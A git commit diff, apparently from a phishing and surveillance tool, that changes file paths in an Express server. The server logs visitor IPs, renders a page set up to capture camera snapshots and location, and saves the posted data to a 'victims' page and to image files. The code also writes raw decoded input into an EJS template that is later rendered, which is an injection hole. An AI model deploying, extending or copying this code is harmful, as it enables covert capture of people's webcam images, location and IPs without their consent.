c64ca4d542b07a3c73d2341957c937bdb697afd1
Amaryllis <175133128+02097597033@users.noreply.github.com>
2025-06-12 16:42:35 -0700

    fix paths for logs and images

--- index.js
+++ index.js
@@ -1,4 +1,5 @@
 const fs = require("fs");
+const path = require("path");
 const express = require("express");
 var bodyParser = require('body-parser');
 const base64ToImage = require('base64-to-image');
@@ -10,27 +11,30 @@ app.use(jsonParser);
 app.use(urlencodedParser);
 app.use(express.static("public"));
 app.set("view engine", "ejs");
+const logPath = path.join(__dirname, 'views', 'log.txt');
+const victimsPath = path.join(__dirname, 'views', 'victims.ejs');
+const imagesDir = path.join(__dirname, 'public', 'images');
+
 app.get("/", (req, res) => {
 var ip;
 var d = new Date();
 d=d.toJSON().slice(0,19).replace('T',':');
 if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
 res.render("index",{ip:ip,time:d,redirect:config.redirectURL,camera:config.camera,cams:config.camsnaps,location:config.location});
-fs.appendFile('./views/log.txt',"Visit Form: "+ip+" | At:"+d+"\n\n", function (err) {
+fs.appendFile(logPath,"Visit From: "+ip+" | At:"+d+"\n\n", function (err) {
 if (err) throw err;
 });
 });
 app.get("/victims",(req,res)=>{res.render("victims");});
 app.post("/",(req,res)=>{
-fs.appendFile('./views/victims.ejs', decodeURIComponent(req.body.data)+"\n\n", function (err) {
+fs.appendFile(victimsPath, decodeURIComponent(req.body.data)+"\n\n", function (err) {
 if (err) throw err;
 console.log('Saved!');
 res.send("Done");
 });
 });
 app.post("/camsnap",(req,res)=>{
-const path = './public/images/';
-const { imageType, fileName } = base64ToImage( decodeURIComponent(req.body.img), path,{ type: 'png' }) 
+const { imageType, fileName } = base64ToImage(decodeURIComponent(req.body.img), imagesDir, { type: 'png' });
 res.send(fileName);
 });
 app.listen(5000, () => {
